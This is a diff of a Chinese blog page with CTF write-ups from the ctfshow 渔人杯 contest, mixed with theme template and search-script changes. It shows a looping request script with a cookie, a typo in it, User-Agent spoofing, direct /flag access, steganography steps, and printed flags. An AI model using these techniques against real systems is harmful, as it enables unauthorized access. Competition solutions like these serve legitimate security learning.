 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://f0c222a9-04f2-431b-ae2b-56e871f6b61b.challenge.ctf.show:8080/sx.php&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=gmnu9pfgh503imv66a9tk37ke2&quot;</span><br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    response=requests.get(url, headers=headers);<br>    print(responsea.text)<br></code></pre></td></tr></table></figure>
-<p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404131900210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404131900210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <h2 id="阿拉丁"><a href="#阿拉丁" class="headerlink" title="阿拉丁"></a>阿拉丁</h2><p>想要啥就有啥</p>
-<p>好家伙，怎么不给flag，不是说想要啥就有啥吗？<br><img src="https://img-blog.csdnimg.cn/20210404132911508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续问，还是没有<br><img src="https://img-blog.csdnimg.cn/20210404133231967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>burp抓包也看不出什么，看了其他师傅的wp，可以直接问flag每一位是什么？，我直接好家伙，这也行。<br><img src="https://img-blog.csdnimg.cn/20210404133052347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总共45位<br><img src="https://img-blog.csdnimg.cn/20210404134253711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>拼接起来</p>
+<p>好家伙，怎么不给flag，不是说想要啥就有啥吗？<br><img src="https://img-blog.csdnimg.cn/20210404132911508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>继续问，还是没有<br><img src="https://img-blog.csdnimg.cn/20210404133231967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>burp抓包也看不出什么，看了其他师傅的wp，可以直接问flag每一位是什么？，我直接好家伙，这也行。<br><img src="https://img-blog.csdnimg.cn/20210404133052347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>总共45位<br><img src="https://img-blog.csdnimg.cn/20210404134253711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>拼接起来</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;a15b2830-dcf4-4344-99e5-350a561cbf89&#125;<br></code></pre></td></tr></table></figure>
-<h2 id="迷"><a href="#迷" class="headerlink" title="迷"></a>迷</h2><p><img src="https://img-blog.csdnimg.cn/20210404135014838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问靶机地址<br><img src="https://img-blog.csdnimg.cn/20210404135001556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有一个登录框，还以为是sql注入，看了群里说直接访问/flag<br><img src="https://img-blog.csdnimg.cn/20210404135103522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>是菜蒙蔽了我的双眼，做个题还被嘲讽了<br><img src="https://img-blog.csdnimg.cn/20210404135150921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="迷"><a href="#迷" class="headerlink" title="迷"></a>迷</h2><p><img src="https://img-blog.csdnimg.cn/20210404135014838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>访问靶机地址<br><img src="https://img-blog.csdnimg.cn/20210404135001556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>有一个登录框，还以为是sql注入，看了群里说直接访问/flag<br><img src="https://img-blog.csdnimg.cn/20210404135103522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>是菜蒙蔽了我的双眼，做个题还被嘲讽了<br><img src="https://img-blog.csdnimg.cn/20210404135150921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <h2 id="飘啊飘"><a href="#飘啊飘" class="headerlink" title="飘啊飘"></a>飘啊飘</h2><p>题目描述：有手X就行</p>
-<p>抓包，伪装请求头<code>User-Agent: Android</code>，状态码302重定向，发现了mb.html<br><img src="https://img-blog.csdnimg.cn/20210405171746862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接访问mb.html<br><img src="https://img-blog.csdnimg.cn/20210405172008540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="简单二维码"><a href="#简单二维码" class="headerlink" title="简单二维码"></a>简单二维码</h2><p>下载附件，一个png图片和一个“wp”，两个假flag。<br><img src="https://img-blog.csdnimg.cn/2021040414094950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用stegsolve进行异或，发现一张二维码<br><img src="https://img-blog.csdnimg.cn/20210404141133808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码，还是假flag<br><img src="https://img-blog.csdnimg.cn/20210404141301883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续异或，还是迷惑信息<br><img src="https://img-blog.csdnimg.cn/20210404141503298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>勾选最低通道，依旧是假flag<br><img src="https://img-blog.csdnimg.cn/20210404142416970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>点击Analyse，选择Steregram Sover进行左右偏移<br><img src="https://img-blog.csdnimg.cn/2021040414211853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>终于找到了真flag，颈椎治疗，哈哈哈</p>
+<p>抓包，伪装请求头<code>User-Agent: Android</code>，状态码302重定向，发现了mb.html<br><img src="https://img-blog.csdnimg.cn/20210405171746862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>直接访问mb.html<br><img src="https://img-blog.csdnimg.cn/20210405172008540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="简单二维码"><a href="#简单二维码" class="headerlink" title="简单二维码"></a>简单二维码</h2><p>下载附件，一个png图片和一个“wp”，两个假flag。<br><img src="https://img-blog.csdnimg.cn/2021040414094950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>用stegsolve进行异或，发现一张二维码<br><img src="https://img-blog.csdnimg.cn/20210404141133808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>扫码，还是假flag<br><img src="https://img-blog.csdnimg.cn/20210404141301883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>继续异或，还是迷惑信息<br><img src="https://img-blog.csdnimg.cn/20210404141503298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>勾选最低通道，依旧是假flag<br><img src="https://img-blog.csdnimg.cn/20210404142416970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>点击Analyse，选择Steregram Sover进行左右偏移<br><img src="https://img-blog.csdnimg.cn/2021040414211853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>终于找到了真flag，颈椎治疗，哈哈哈</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;Jing_Zhui_Zhi_Liao&#125;<br></code></pre></td></tr></table></figure>
-<h2 id="我跟你拼了"><a href="#我跟你拼了" class="headerlink" title="我跟你拼了"></a>我跟你拼了</h2><p>狸题，下载附件ttt.png和mask.png<img src="https://img-blog.csdnimg.cn/20210404142546734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我傻乎乎的在那拼图，看了wp原来直接修改图片高度就行了，666，果然狸题就是离谱<br><img src="https://img-blog.csdnimg.cn/20210404143008250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="我跟你拼了"><a href="#我跟你拼了" class="headerlink" title="我跟你拼了"></a>我跟你拼了</h2><p>狸题，下载附件ttt.png和mask.png<img src="https://img-blog.csdnimg.cn/20210404142546734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>我傻乎乎的在那拼图，看了wp原来直接修改图片高度就行了，666，果然狸题就是离谱<br><img src="https://img-blog.csdnimg.cn/20210404143008250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>参考文章：<br><a target="_blank" rel="noopener" href="https://l1near.top/index.php/2021/04/03/100.html">首届“红明谷”杯技能场景赛MISC_WP</a></p>
-</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://swhat.github.io/tags/Write-up/">Write up</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">HTTP协议</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"><span class="paginator-prev__text">Struts2核心配置</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%99%8E%E7%AC%A6CTF"><span class="toc-number">1.</span> <span class="toc-text">虎符CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">Web-签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-%E4%BD%A0%E4%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%90%97"><span class="toc-number">1.2.</span> <span class="toc-text">MISC-你会日志分析吗</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7CTF"><span class="toc-number">2.</span> <span class="toc-text">红明谷CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-write-shell"><span class="toc-number">2.1.</span> <span class="toc-text">Web-write_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-%E6%88%91%E7%9A%84%E5%BF%83%E6%98%AF%E5%86%B0%E5%86%B0%E7%9A%84"><span class="toc-number">2.2.</span> <span class="toc-text">MISC-我的心是冰冰的</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF"><span class="toc-number">3.</span> <span class="toc-text">ctfshow渔人杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E6%8A%BD%E5%A5%96"><span class="toc-number">3.1.</span> <span class="toc-text">签到抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%84%9F%E5%8F%97%E4%B8%8B%E6%B0%94%E6%B0%9B"><span class="toc-number">3.2.</span> <span class="toc-text">感受下气氛</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%9E%E4%BB%99%E5%A7%90%E5%A7%90"><span class="toc-number">3.3.</span> <span class="toc-text">神仙姐姐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%BF%E6%8B%89%E4%B8%81"><span class="toc-number">3.4.</span> <span class="toc-text">阿拉丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%B7"><span class="toc-number">3.5.</span> <span class="toc-text">迷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A3%98%E5%95%8A%E9%A3%98"><span class="toc-number">3.6.</span> <span class="toc-text">飘啊飘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="toc-number">3.7.</span> <span class="toc-text">简单二维码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E8%B7%9F%E4%BD%A0%E6%8B%BC%E4%BA%86"><span class="toc-number">3.8.</span> <span class="toc-text">我跟你拼了</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/2.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Atkx</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/swhat" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://plus.google.com/" target="_blank" rel="noopener" data-popover="Google" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-google"></i></span></a><a class="sidebar-ov-social-item" href="https://twitter.com/" target="_blank" rel="noopener" data-popover="Twitter" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-twitter"></i></span></a><a class="sidebar-ov-social-item" href="https://youtube.com/" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">10</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">22</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
-  var isXML = true;
-  var search_path = 'search.json';
 
-  if (!search_path) {
-    search_path = 'search.xml';
-  } else if (/json$/i.test(search_path)) {
-    isXML = false;
-  }
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Write-up/">Write up</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTTP协议</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/">
+                        <span class="hidden-mobile">Struts2核心配置</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-  var path = '/' + search_path;
-  $.ajax({
-    url: path,
-    dataType: isXML ? 'xml' : 'json',
-    async: true,
-    success: function (res) {
-      var datas = isXML ? $('entry', res).map(function () {
-        // 将 XML 转为 JSON
-        return {
-          title: $('title', this).text(),
-          content: $('content', this).text(),
-          url: $('url', this).text()
-        };
-      }).get() : res;
-      var $input = $('.search-input input');
-      var $result = $('.search-results');
-      // 搜索对象（标题、内容）的权重，影响显示顺序
-      var WEIGHT = { title: 100, content: 1 };
-      var searchPost = function () {
-        var searchText = $input.val().toLowerCase().trim();
-        // 根据空白字符分隔关键字
-        var keywords = searchText.split(/[\s]+/);
-        // 搜索结果
-        var matchPosts = [];
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
-        // 有多个关键字时，将原文字整个保存下来
-        if (keywords.length > 1) {
-          keywords.push(searchText);
-        }
-        // 防止未输入字符时搜索
-        if (searchText.length > 0) {
-          datas.forEach(function (data) {
-            var isMatch  = false;
-            // 没有标题的文章使用预设的 i18n 变量代替
-            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
-            var titleLower = title && title.toLowerCase();
-            // 删除 HTML 标签 和 所有空白字符
-            var content = data.content && data.content.replace(/<[^>]+>/g, '');
-            var contentLower = content && content.toLowerCase();
-            // 删除重复的 /
-            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
-            // 标题中匹配到的关键词
-            var titleHitSlice = [];
-            // 内容中匹配到的关键词
-            var contentHitSlice = [];
+      </div>
+    
+  </div>
+</div>
 
-            keywords.forEach(function (keyword) {
-              /**
-              * 获取匹配的关键词的索引
-              * @param {String} keyword 要匹配的关键字
-              * @param {String} text 原文字
-              * @param {Boolean} caseSensitive 是否区分大小写
-              * @param {Number} weight 匹配对象的权重。权重大的优先显示
-              * @return {Array}
-              */
-              function getIndexByword (word, text, caseSensitive, weight) {
-                if (!word || !text) {
-                  return [];
-                };
+<!-- Custom -->
 
-                var startIndex = 0; // 每次匹配的开始索引
-                var index = -1;     // 匹配到的索引值
-                var result = [];    // 匹配结果
 
-                if (!caseSensitive) {
-                  word = word.toLowerCase();
-                  text = text.toLowerCase();
-                }
+    
 
-                while((index = text.indexOf(word, startIndex)) !== -1) {
-                  var hasMatch = false;
-                  // 索引位置相同的关键词，保留长度较长的
-                  titleHitSlice.forEach(function (hit) {
-                    if (hit.index === index && hit.word.length < word.length) {
-                      hit.word = word;
-                      hasMatch = true;
-                    }
-                  });
-                  startIndex = index + word.length;
-                  !hasMatch && result.push({ index: index, word: word, weight: weight });
-                }
-                return result;
-              }
-              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
-              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
-            });
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-            var hitTitle = titleHitSlice.length;
-            var hitContent = contentHitSlice.length;
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
 
-            if (hitTitle > 0 || hitContent > 0) {
-              isMatch = true;
-            }
-            if (isMatch) {
-              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
-                // 按照匹配文字的索引的递增顺序排序
-                hit.sort(function (left, right) {
-                  return left.index - right.index;
-                });
-              });
-              /**
-              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
-              * @param {String} text 原文本
-              * @param {Array} hitSlice 匹配项的索引信息
-              * @param {Number} start 开始索引
-              * @param {Number} end 结束索引
-              * @return {String}
-              */
-              function highlightKeyword (text, hitSlice, start, end) {
-                if (!text || !hitSlice || !hitSlice.length) {
-                  return;
-                }
+    
+  </main>
 
-                var result = '';
-                var startIndex = start;
-                var endIndex = end;
-                hitSlice.forEach(function (hit) {
-                  if (hit.index < startIndex) {
-                    return;
-                  }
+  <footer class="text-center mt-5 py-3">
